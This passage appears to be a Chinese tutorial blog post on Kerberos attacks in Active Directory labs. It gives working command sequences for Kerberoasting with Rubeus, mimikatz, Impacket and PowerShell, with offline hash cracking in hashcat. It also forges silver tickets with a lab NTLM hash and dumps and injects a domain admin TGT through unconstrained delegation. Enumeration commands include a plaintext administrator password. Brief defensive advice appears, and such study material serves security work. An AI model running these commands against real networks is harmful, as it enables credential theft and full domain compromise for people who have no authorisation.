<p>3.如果攻击者的 TGT 是有效的，则 DC 将从TGT认购权证中提取信息并填充到ST服务票据中。 然后，域控制器查找哪个帐户在ServicedPrincipalName 字段中注册了所请求的 SPN。ST服务票据使用注册了所要求的 SPN 的帐户的NTLM哈希进行加密,并使用攻击者和服务帐户共同商定的加密算法。ST服务票据以服务票据回复(TGS-REP)的形式发送回攻击者。</p>
<p>4.攻击者从 TGS-REP 中提取加密的服务票证。 由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。</p>
<p><strong>首先是请求服务票据</strong></p>
<p>1.Rubeus.exe请求</p>
<p>Rubeus里面的kerberoast支持对所有用户或者特定用户执行kerberoasting操作，其原理在于先用LDAP查询于内的spn，再通过发送TGS包，然后直接打印出能使用<br>hashcat 或 john 爆破的Hash。以下的命令会打印出注册于用户下的所有SPN的服务票据的hashcat格式</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/8afb272f858eaba8b2f0962e1dba1cc3.png"></p>
<p>2.powershell请求</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#请求服务票据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"></span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">&quot;MSSQLSvc/Srv-DB-0day.0day.org:1433&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#列出服务票据</span></span><br><span class="line"></span><br><span class="line">klist</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/708a10f656614429e68c4f8d3311ae12.png"></p>
<p>3.mimikatz请求</p>
<p>请求服务票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ask /target:MSSQLSvc/Srv-DB-0day.0day.org:1433</span><br></pre></td></tr></table></figure>
<p>列出服务票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
<p>清除所有票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>
<p>4.Impacket中的GetUserSPNS.py请求</p>
<p>该脚本可以请求注册于用户下的所有SPN的服务票据。使用该脚本需要提供域账号密码才能查询。该脚本直接输出hashcat格式的服务票据，可用hashcat直接爆破。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py -request -dc-ip <span class="number">192.168</span><span class="number">.200</span><span class="number">.143</span> 0day.org/jack</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/9c993f9bedb14e7b7bd115e59b86c966.png"></p>
<p><strong>导出票据</strong></p>
<p>首先是查看<br><code>klist</code>或<code>mimikatz.exe &quot;kerberos::list&quot;</code></p>
<p>MSF里面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">kerberos_ticket_list</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">kiwi_cmd kerberos::list</span><br></pre></td></tr></table></figure>

<p>1.mimikatz导出</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::list /export&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
<p>执行完后，会在mimikatz同目录下导出 后缀为kirbi的票据文件</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/fc05c91abe549a89884bbcdf1082d865.png"></p>
<p>2.Empire下的Invoke-Kerberoast.ps1</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-Kerberoast</span>.ps1;<span class="built_in">Invoke-Kerberoast</span> <span class="literal">-outputFormat</span> Hashcat</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/175a766c924bc6855dd30cdd2f31e061.png"></p>
<p><strong>离线破解服务票据</strong></p>
<p>1.kerberoast中的tgsrepcrack.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tgsrepcrack.py password.txt xx.kirbi</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/bf586e1036a8801ce693c89cc5bc354a.png"></p>
<p>2.hashcat</p>
<p>将导出的hashcat格式的哈希保存为hash.txt文件，放到hashcat的目录下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt pass.txt</span><br></pre></td></tr></table></figure>
<p><strong>Kerberoast攻击防范</strong></p>
<p>确保服务账号密码为强密码(长度、随机性、定期修改)</p>
<p>如果攻击者无法将默认的AES256_HMAC加密方式改为RC4_HMAC_MD5，就无法实验tgsrepcrack.py来破解密码。</p>
<p>攻击者可以通过嗅探的方法抓取Kerberos TGS票据。因此，如果强制实验AES256_HMAC方式对Kerberos票据进行加密，那么，即使攻击者获取了Kerberos票据，也无法将其破解，从而保证了活动目录的安全性。</p>
<p>许多服务账户在内网中被分配了过高的权限，且密码强度较差。攻击者很可能通过破解票据的密码，从域用户权限提升到域管理员权限。因此，应该对服务账户的权限进行适当的配置，并提高密码的强度。</p>
<p>在进行日志审计时，可以重点关注ID为4679(请求Kerberos服务票据)的时间。如果有过多的 4769 日志，应进一步检查系统中是否存在恶意行为。</p>
<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>在TGS-REP阶段，TGS_REP里面的ticket的enc-part是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是TGS票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC<br>PAC签名，则银票将不起作用</p>
<p>要创建白银票据，我们需要知道以下信息：</p>
<ul>
<li><p>  要伪造的域用户(这里我们一般填写域管理员账户)</p>
</li>
<li><p>  域名</p>
</li>
<li><p>  域的SID值(就是域成员SID值去掉最后的)</p>
</li>
<li><p>  目标服务的FQDN</p>
</li>
<li><p>  可利用的服务</p>
</li>
<li><p>  服务账号的NTLM哈希</p>
</li>
</ul>
<p>这里使用白银票据伪造CIFS服务，该通常用于Windows主机之间的文件共享。</p>
<p>1.mimikatz获得服务账号的ntlm hash</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::Debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/c6fcd574aff17010471d5e2969455d6a.png"></p>
<p>得到ntlm为7c64e7ebf46b9515c56b2dd522d21c1c</p>
<p>2.使用白银票据攻击</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:Drunkmars.com /sid:S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-652679085</span><span class="literal">-3170934373</span><span class="literal">-4288938398</span> /target:WIN<span class="literal">-M836NN6NU8B</span>.Drunkmars.com /service:cifs /rc4:<span class="number">7</span>c64e7ebf46b9515c56b2dd522d21c1c /user:administrator /ptt</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/151fb6975352c08d574e206b6b4882c7.png"></p>
<p>3.查看票据</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/608b66a74f0cfdf54b381398279e2dbf.png"></p>
<p>4.访问域控</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6cec7f558f9466978f56f4cbf337bc9d.png"></p>
<p><strong>防御：</strong></p>
<p>伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC<br>PAC签名，则银票将不起作用。</p>
<h2 id="黄金票据和白银票据的不同点"><a href="#黄金票据和白银票据的不同点" class="headerlink" title="黄金票据和白银票据的不同点"></a>黄金票据和白银票据的不同点</h2><p><strong>访问权限不同：</strong></p>
<p>黄金票据<code>Golden Ticket</code>：伪造TGT认购权证，可以获取任何Kerberos服务权限</p>
<p>白银票据<code>Silver Ticket</code>：伪造ST服务票据，只能访问指定的服务</p>
<p><strong>加密方式不同：</strong></p>
<p><code>Golden Ticket</code>由krbtgt的Hash加密</p>
<p><code>Silver Ticket </code>由服务账号（通常为计算机账户）Hash加密</p>
<p><strong>认证流程不同：</strong></p>
<p><code>Golden Ticket</code>的利用过程需要访问域控，而<code>Silver Ticket</code>不需要</p>
<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p>域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p>
<p>服务账号（<code>Service Account</code>），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MSSQL Server在安装时，</p>
<p>会在域内自动注册服务账号<code>&#39;SqlServiceAccount&#39;</code>，这类账号不能用于交互式登录。</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/3e0e2fb37d6d7f0ccec809a754cb1b13.png"></p>
<p>上图是经典的应用场景。一个域内普通用户jack通过Kerberos协议认证到前台WEB服后，前台运行WEB服务的服务账号websvc模拟（Impersonate）用户jack，以Kerberos协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中跳或者多跳的Kerberos认证。按照图中红色字体的数字，具体步骤如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.  域内用户jack以Kerberos方式认证后访问Web服务器；</span><br><span class="line"></span><br><span class="line">2.  Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请；</span><br><span class="line"></span><br><span class="line">3.  KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据TGT；</span><br><span class="line"></span><br><span class="line">4.  websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据TGS；</span><br><span class="line"></span><br><span class="line">5.  KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据TGS；</span><br><span class="line"></span><br><span class="line">6.  websvc收到的jack用户的授权票据TGS后，可访问文件服务，完成多跳认证。</span><br></pre></td></tr></table></figure>
<p>在域中，只有 服务账号 和 主机账号 才具有委派属性</p>
<p>主机账号就是AD活动目录中 Computers 中的计算机，也可以称为机器账号(一个普通域用户默认最多可以创建十个主机账号)。服务账号（Service Account）是域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来并加入域。例如SQL Server 在安装时，会在域内自动注册服务账号 SQLServiceAccount。也可以将域用户通过注册SPN变为服务账号。</p>
<p><strong>委派的前提</strong></p>
<p>需要被委派的用户未设置不允许被委派属性，这里如果打勾则Administrator用户不能够被委派</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6f9a3bacc28b732a0b88beec4d515e8b.png"></p>
<h2 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h2><p>对于非约束性委派，服务账号可以获取被委派用户的 TGT ，并将 TGT 缓存到 LSASS 进程中，从而服务账号可使用该 TGT ，模拟用户访问任意服务。</p>
<p>当服务账号或者主机被设置为非约束性委派时，其 userAccountControl 属性会包含 WORKSTATION_TRUSTED_FOR_DELEGATION</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/21f6fd3c641b70f2eb2c189332c459ce.png"></p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/243147d5732d4942e549c4d1d7227707.png"></p>
<p>从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。</p>
<h2 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h2><p>由于非约束委派的不安全性，微软在Windows Server 2003中发布了约束性委派。对于约束性委派（Constrained Delegation），即Kerberos的两个扩展子协议 S4u2self (Service for User to Self) 和 S4u2Proxy (Service for User to Proxy)，服务账号只能获取用户的TGS，从而只能模拟用户访问特定的服务。</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/dcc3fcee272ec5c44380a6108a718d74.png"></p>
<p>配置了约束委派的账户的 userAccountControl 属性有个FLAG位 TRUSTED_TO_AUTH_FOR_DELEGATION，并且msDS-AllowedToDelegateTo 属性，还会指定对哪个SPN进行委派。</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6a5c684067f4c164404b41aaccd68522.png"></p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/40664925e2104cb2cd2973e496e1acfc.png"></p>
<h2 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h2><p>为了使用户/资源更加独立，微软在Windows Server 2012中引入了基于资源的约束性委派。基于资源的约束委派不需要域管理员权限去设置，而把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派只能在运行WindowsServer2012和Windows Server 2012R2及以上的域控制器上配置，但可以在混合模式林中应用。配置了基于资源的约束委派的账户的userAccountControl属性为 WORKSTATION_TRUST_ACCOUNT，并且msDS-AllowedToActOnBehalfOfOtherIdentity属性的值为被允许基于资源约束性委派的账号的SID。</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/ab60aaa3ce99adafec74f756562104ba.png"></p>
<h2 id="基于资源的约束性委派和约束性委派差别"><a href="#基于资源的约束性委派和约束性委派差别" class="headerlink" title="基于资源的约束性委派和约束性委派差别"></a>基于资源的约束性委派和约束性委派差别</h2><p>委派的权限授予给了拥有资源的后端(B)，而不再是前端(A)</p>
<p>约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林</p>
<p>不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑”msDS-AllowedToActOnBehalfOfOtherIdentity”属性的权限，也就是将计算机加入域的域用户 和 机器自身 拥有权限。</p>
<p>传统的约束委派是“正向的”，通过修改服务A的属性”msDS-AllowedToDelegateTo”，添加服务B的SPN（Service Principle Name），设置约束委派对象（服务B），服务A便可以模拟用户向域控制器请求访问服务B的ST服务票据。</p>
<p>而基于资源的约束委派则是相反的，通过修改服务B属性”msDS-AllowedToActOnBehalfOfOtherIdentity”，添加服务A的SID，达到让服务A模拟用户访问B资源的目的。</p>
<h2 id="非约束委派和约束委派的流程"><a href="#非约束委派和约束委派的流程" class="headerlink" title="非约束委派和约束委派的流程"></a>非约束委派和约束委派的流程</h2><h3 id="非约束委派流程"><a href="#非约束委派流程" class="headerlink" title="非约束委派流程"></a>非约束委派流程</h3><p>前提：在机器账号B上配置了非约束性委派(域管理员才有权限配置)</p>
<p>1.用户访问机器B的某个服务，于是向KDC认证。KDC会检查机器B的机器账号的属性，发现是非约束性委派，KDC会将用户的TGT放在ST服务票据中。</p>
<p>2.用户访问机器B时，TGT票据会和ST服务票据一同发送给机器B</p>
<p>3.这样B在验证ST服务票据的同时获取了用户的TGT，并将TGT存储在LSASS进程中，从而可以模拟用户访问任意服务。</p>
<p>从网络攻击的角度来看，如果攻击者控制了机器B的机器账号，并且机器B配置了非约束性委派。则攻击者可以诱骗管理员来访问机器B，然后攻击者可以获取管理员的TGT，从而模拟管理员访问任意服务，即获得了管理员权限。</p>
<h3 id="约束性委派流程"><a href="#约束性委派流程" class="headerlink" title="约束性委派流程"></a>约束性委派流程</h3><p>前提：在服务A上配置到服务B约束性委派(域管理员才有权限配置)</p>
<p>1.用户访问服务A，于是向域控进行kerberos认证，域控返回ST1服务票据给用户，用户使用此服务票据访问服务A</p>
<p>2.若该服务A允许委派给服务B，则A能使用S4U2Proxy协议将用户发送给自己的可转发的ST1服务票据以用户的身份再转发给域控制器。于是域控返回给服务A一个ST2服务票据。</p>
<p>3.服务A便能使用获得的ST2服务票据以用户的身份访问服务B。</p>
<p>从网络攻击的角度来看，如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。则攻击者可以利用服务A以administrator身份访问域控的CIFS服务，即相当于控制了域控。</p>
<h1 id="筛选非委派属性的账号"><a href="#筛选非委派属性的账号" class="headerlink" title="筛选非委派属性的账号"></a>筛选非委派属性的账号</h1><p>注：域控主机账户默认开启非约束委派</p>
<h2 id="PowerSploit下的PowerView-ps1脚本"><a href="#PowerSploit下的PowerView-ps1脚本" class="headerlink" title="PowerSploit下的PowerView.ps1脚本"></a>PowerSploit下的PowerView.ps1脚本</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\\PowerView.ps1;</span><br></pre></td></tr></table></figure>
<p>查询域中配置非约束委派的账户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-NetUser</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> Drunkmars.com</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-NetUser</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> Drunkmars.com \| <span class="built_in">select</span> name</span><br></pre></td></tr></table></figure>
<p>查询域中配置非约束委派的主机：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-NetComputer</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> Drunkmars.com \| <span class="built_in">select</span> name</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/b0ebd3b10099c34949cceca1f858e298.png"></p>
<h2 id="ADFind"><a href="#ADFind" class="headerlink" title="ADFind"></a>ADFind</h2><p>使用参数</p>
<p>AdFind [switches] [-b basedn] [-f filter] [attr list]</p>
<p>参数说明：</p>
<p>-b：指定要查询的根节点</p>
<p>-f：LDAP过滤条件</p>
<p>attr list：需要显示的属性</p>
<p>查找域中配置非约束委派的用户：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-b</span> <span class="string">&quot;DC=0day,DC=org&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cndistinguishedName</span><br></pre></td></tr></table></figure>
<p>查找域中配置非约束委派的主机：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-b</span> <span class="string">&quot;DC=0day,DC=org&quot;</span> <span class="operator">-f</span> <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cndistinguishedName</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/0f2a1eb4be699ad7d0e6b7debcb18b02.png"></p>
<h2 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h2><p>kali自带，可以在域外使用</p>
<p>查找域中配置非约束委派的用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch <span class="literal">-x</span> <span class="literal">-H</span> ldap://<span class="number">192.168</span>.<span class="number">200.143</span>:<span class="number">389</span> <span class="literal">-D</span> <span class="string">&quot;CN=administrator,CN=Users,DC=0day,DC=org&quot;</span> <span class="literal">-w</span> admin\!\<span class="selector-tag">@</span>\<span class="number">45</span> <span class="literal">-b</span><span class="string">&quot;DC=0day,DC=org&quot;</span><span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> |grep <span class="literal">-iE</span> <span class="string">&quot;distinguishedName&quot;</span></span><br></pre></td></tr></table></figure>
<p>查找域中配置非约束委派的主机</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell ldapsearch <span class="literal">-x</span> <span class="literal">-H</span> ldap://<span class="number">192.168</span>.<span class="number">200.146</span>:<span class="number">389</span> <span class="literal">-D</span> <span class="string">&quot;CN=administrator,CN=Users,DC=0day,DC=org&quot;</span> <span class="literal">-w</span> admin\!\<span class="selector-tag">@</span>\<span class="number">45</span> <span class="literal">-b</span><span class="string">&quot;DC=0day,DC=org&quot;</span> <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> | grep <span class="literal">-iE</span> <span class="string">&quot;distinguishedName&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/27f74d3ee890557928435556614c8448.png"></p>
<p>查询某用户是否具有委派性</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\\powerview.ps1;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-DomainUser</span> 域用户名 <span class="literal">-Properties</span></span><br><span class="line">useraccountcontrol,msds<span class="literal">-allowedtodelegateto</span>| <span class="built_in">fl</span></span><br></pre></td></tr></table></figure>
<p>当该账号没委派属性时，查询不出任何信息</p>
<p>当服务账号被设置为 非约束性委派 时，其 userAccountControl 属性会包含为 TRUSTED_FOR_DELEGATION</p>
<p>当被设置为 约束性委派 时，其 userAccountControl 属性包含</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRUSTED_TO_AUTH_FOR_DELEGATION</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/aa772300%28v=vs.85%29.aspx">https://msdn.microsoft.com/en-us/library/aa772300%28v=vs.85%29.aspx</a></p>
<p>且msds-allowedtodelegateto 属性会被设置为哪些 SPN。</p>
<h1 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h1><p><strong>非约束委派</strong>：当user访问service1时，如果service1的服务账号开启了 unconstrained delegation （非约束委派），则当 user 访问 service1时会将user的 TGT 发送给 service1 并保存在内存中以备下次重用，然后 service1 就可以利用这张 TGT 以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了</p>
<p>操作环境：</p>
<ul>
<li><p>  域：Drunkmars.com</p>
</li>
<li><p>  域控：windows server 2012R2，主机名：WIN-M836NN6NU8B，IP： 192.168.10.5</p>
</li>
<li><p>  域管账户：sqladmin</p>
</li>
<li><p>  域内主机：windows7，主机名：MESSI-PC，IP：192.168.10.7，用户：mars2(普通域用户)</p>
</li>
</ul>
<p>注：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的</p>
<h2 id="查找非约束委派主机帐号"><a href="#查找非约束委派主机帐号" class="headerlink" title="查找非约束委派主机帐号"></a>查找非约束委派主机帐号</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\\powerview.ps1;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-NetComputer</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> Drunkmars.com \| <span class="built_in">select</span> name</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/218a5d25a138bc6f02d0ed29a0f8b0f9.png"></p>
<h2 id="导出票据"><a href="#导出票据" class="headerlink" title="导出票据"></a>导出票据</h2><p>先访问DC，可以看到访问失败</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/6b05fb6881d50f6dbe9e5a402bfe7ea3.png"></p>
<p>用任意域管帐号访问win7(这里域管帐号登录在任意一台机器都可以)</p>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/1c3820c6f250dd2c1491dcbd5c1c0cb6.png"></p>
<p>此时，在主机win8的lsass.exe内存中就会有域用户sqladmin的TGT票据</p>
<p>我们在win8上以管理员权限运行mimikatz，执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
<p>导出票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/27ed3bac0576d3839be5203cf1f3f406.png"></p>
<h2 id="注入票据"><a href="#注入票据" class="headerlink" title="注入票据"></a>注入票据</h2><p>用 mimikatz 将这个票据导入内存中，然后访问域控</p>
<p>导入票据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [<span class="number">0</span>;<span class="number">33</span><span class="type">f6ebf</span>]<span class="literal">-2</span><span class="literal">-0</span><span class="literal">-60a00000</span><span class="literal">-sqladmin</span>@krbtgt<span class="literal">-0DAY</span>.ORG.kirbi</span><br></pre></td></tr></table></figure>
<p>查看票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
<p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/fbd9bf7eb7a65c51758409253cf51415.png"></p>
<h2 id="访问域控"><a href="#访问域控" class="headerlink" title="访问域控"></a>访问域控</h2><p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/16a25af15878d850cebdf9c63c8d86dc.png"></p>
<h1 id="约束性委派攻击"><a href="#约束性委派攻击" class="headerlink" title="约束性委派攻击"></a>约束性委派攻击</h1><p>操作环境：</p>
<p>域：0day.org</p>
<p>域内主机： windows 7 ，主机名：PC-jack-0day，IP：192.168.3.62，用户：jack</p>
<p>域控：OWA2010SP3</p>
<p>我们设置了机器用户PC-jack-0day对OWA2010SP3的 cifs 服务的委派</p>
<h2 id="查找约束性委派的主机账号"><a href="#查找约束性委派的主机账号" class="headerlink" title="查找约束性委派的主机账号"></a>查找约束性委派的主机账号</h2><p><img src="/images/Kerberos%E5%8D%8F%E8%AE%AE&%E6%BC%8F%E6%B4%9E/32f950c08b5145cd62460ae6c1a45553.png"></p>
